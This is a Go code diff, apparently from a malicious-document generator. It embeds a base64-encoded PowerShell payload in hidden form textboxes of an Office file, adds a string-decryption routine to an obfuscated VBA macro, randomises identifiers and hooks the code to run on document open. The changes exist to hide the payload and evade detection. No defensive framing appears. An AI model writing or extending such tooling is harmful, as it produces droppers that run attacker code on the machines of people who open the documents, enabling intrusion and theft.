@@ -48,6 +48,12 @@ func setupForm(strList map[string]map[int]string, nameMap map[string]string, new
 		n = addTextBox(n, nameMap[fmt.Sprintf("TextBox%v", n)], value, newForm)
 	}
 
+	for n, value := range strList["PSPayload"] {
+		nameMap["PSPayload"] = obf.RandStringBytes(12)
+		fmt.Printf("PSPayload text is %s\n", value)
+		n = addTextBox(n, nameMap["PSPayload"], value, newForm)
+	}
+
 	for n, value := range strList["Label"] {
 		nameMap[fmt.Sprintf("Label%v", n)] = obf.RandStringBytes(12)
 		fmt.Printf("Label%v text is %s\n", n, value)
@@ -114,7 +120,10 @@ func main() {
 
 	thisDoc.SetName(obf.RandStringBytes(12))
 
-	code, funcMap, _, _ := obf.ObfuscateVBCode(resources.EntryPointFunction, 12)
+	// Merges EntryPoint with String decrypt routine
+	vbaModuleCode := fmt.Sprintf("%v\n%v", resources.EntryPointFunction, resources.StringDecryptFunction)
+
+	code, funcMap, _, _, strList := obf.ObfuscateVBCode(vbaModuleCode, 12)
 	docOpen := fmt.Sprintf(resources.DocumentOpen, obf.RandStringBytes(12))
 	docOpen = strings.ReplaceAll(docOpen, "EntryPoint", funcMap["EntryPoint"])
 
@@ -130,17 +139,20 @@ func main() {
 	resources.Payload = fmt.Sprintf(resources.Payload, "[REDACTED]", "[REDACTED]")
 
 	b64Payload, _ := newEncodedPSScript(resources.Payload)
-	finalPayload := fmt.Sprintf(resources.TextBox3, b64Payload)
+	finalPayload := fmt.Sprintf(resources.PSPayload, b64Payload)
 
-	strList := map[string]map[int]string{
-		"TextBox": {1: encode(resources.TextBox1, resources.Offset, resources.Sep),
-			2: encode(resources.TextBox2, resources.Offset, resources.Sep),
-			3: encode(finalPayload, resources.Offset, resources.Sep)},
-		"Label": {1: resources.Label1,
-			2: resources.Label2},
+	strMap := map[string]map[int]string{
+		"TextBox":   {},
+		"PSPayload": {0: encode(finalPayload, resources.Offset, resources.Sep)},
+		"Label": {1: resources.Offset, // Label1 is Offset
+			2: resources.Sep}, // Label2 is Sep
 	}
 
-	code = setupForm(strList, nameMap, newForm, code)
+	for i, p := range strList {
+		strMap["TextBox"][i] = encode(p, resources.Offset, resources.Sep)
+	}
+
+	code = setupForm(strMap, nameMap, newForm, code)
 
 	newModule := document.VBProject.VBComponents.AddVBComponent(obf.RandStringBytes(12), gomacro.MODULE)
 	newModule.CodeModule.AddFromString(code)
